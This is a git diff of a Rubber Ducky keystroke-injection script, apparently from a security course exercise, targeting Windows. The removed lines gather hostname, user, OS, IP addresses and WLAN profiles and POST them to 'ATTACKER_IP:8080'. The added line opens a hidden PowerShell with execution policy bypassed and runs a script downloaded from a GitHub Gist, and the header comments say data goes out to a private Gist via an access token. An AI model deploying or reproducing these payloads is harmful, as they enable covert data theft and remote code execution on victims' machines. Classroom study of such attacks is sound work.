@@ -2,43 +2,19 @@ REM ============================================================
 REM  W02a.2 – Rubber Ducky: Information Gathering
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows
-REM  Beschreibung: Sammelt System- und WLAN-Infos und sendet
-REM                sie per HTTP an einen lokalen Webserver
 REM
-REM  Voraussetzung: Python-Server läuft auf ATTACKER_IP:8080
-REM  Ersetze ATTACKER_IP mit der echten IP-Adresse!
+REM  Lädt info_gather.ps1 von einem öffentlichen GitHub Gist.
+REM  Exfiltration erfolgt als privates GitHub Gist – kein
+REM  lokaler Server nötig, funktioniert über alle Subnetze.
+REM
+REM  Setup:
+REM    1. info_gather.ps1 als öffentliches Gist hochladen
+REM    2. GITHUB_PAT in info_gather.ps1 eintragen
+REM    3. GIST_RAW_URL unten ersetzen (Raw-URL des Gists)
 REM ============================================================
 
 DELAY 2000
 
-REM Minimiertes PowerShell-Fenster öffnen
 GUI r
 DELAY 500
-STRINGLN powershell -WindowStyle Minimized
-DELAY 1500
-
-REM Systeminformationen sammeln
-STRINGLN $hostname = $env:COMPUTERNAME
-DELAY 200
-STRINGLN $user = $env:USERNAME
-DELAY 200
-STRINGLN $os = (Get-WmiObject Win32_OperatingSystem).Caption
-DELAY 200
-STRINGLN $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*'} | Select-Object -ExpandProperty IPAddress) -join ','
-DELAY 200
-
-REM WLAN-Profile auslesen (Profilnamen)
-STRINGLN $wifi = (netsh wlan show profiles) | Out-String
-DELAY 500
-
-REM Alle Infos kombinieren
-STRINGLN $body = "HOSTNAME=$hostname`nUSER=$user`nOS=$os`nIP=$ip`nWIFI_PROFILES=$wifi"
-DELAY 200
-
-REM Per HTTP POST an den Angreifer-Server senden (curl-Alias in PS)
-STRINGLN Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/collect' -Method POST -Body $body -UseBasicParsing
-DELAY 3000
-
-REM Fenster schließen und Spuren verwischen
-STRINGLN exit
-DELAY 500
+STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
